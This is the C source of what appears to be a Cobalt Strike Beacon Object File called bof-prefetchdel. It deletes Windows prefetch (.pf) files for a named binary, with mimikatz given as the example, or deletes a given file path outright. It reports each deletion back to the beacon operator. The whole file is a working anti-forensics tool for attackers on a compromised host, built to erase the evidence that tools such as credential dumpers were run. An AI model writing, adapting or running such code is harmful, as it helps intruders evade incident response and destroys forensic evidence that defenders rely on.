/*
 * bof-prefetchdel <binary-name | full-path>
 *
 * Delete prefetch traces for a binary.  Given a bare name (for example
 * mimikatz or mimikatz.exe) it removes %SystemRoot%\Prefetch\<name>*.pf.
 * Given a path it deletes that exact file.  Requires admin (the Prefetch
 * directory is protected) and only works if prefetching is enabled.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *arg;
    int alen2 = 0;
    char pattern[MAX_PATH], dir[MAX_PATH];
    WIN32_FIND_DATAA fd;
    HANDLE h;
    int deleted = 0;
    int exact = 0;

    BeaconDataParse(&parser, args, alen);
    arg = BeaconDataExtract(&parser, &alen2);
    if (!arg || !arg[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: prefetchdel <binary-name | full-path>\n");
        return;
    }

    if (bof_strstr(arg, "\\") || (arg[0] && arg[1] == ':')) {
        exact = 1;
        bof_strncpy(pattern, arg, sizeof(pattern));
    } else {
        KERNEL32$ExpandEnvironmentStringsA("%SystemRoot%\\Prefetch", dir,
                                           sizeof(dir));
        bof_strncpy(pattern, dir, sizeof(pattern));
        bof_strncat(pattern, "\\", sizeof(pattern) - bof_strlen(pattern) - 1);
        bof_strncat(pattern, arg, sizeof(pattern) - bof_strlen(pattern) - 1);
        bof_strncat(pattern, "*.pf", sizeof(pattern) - bof_strlen(pattern) - 1);
    }

    h = KERNEL32$FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "no match for %s: %lu\n", pattern,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    do {
        char file[MAX_PATH];
        if (exact) {
            bof_strncpy(file, pattern, sizeof(file));
        } else {
            bof_strncpy(file, dir, sizeof(file));
            bof_strncat(file, "\\", sizeof(file) - bof_strlen(file) - 1);
            bof_strncat(file, fd.cFileName, sizeof(file) - bof_strlen(file) - 1);
        }
        if (KERNEL32$DeleteFileA(file)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] deleted %s\n", file);
            deleted++;
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] %s: %lu\n", file,
                         (unsigned long)KERNEL32$GetLastError());
        }
        if (exact) break;
    } while (KERNEL32$FindNextFileA(h, &fd));

    KERNEL32$FindClose(h);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] %d prefetch file(s) removed\n", deleted);
}
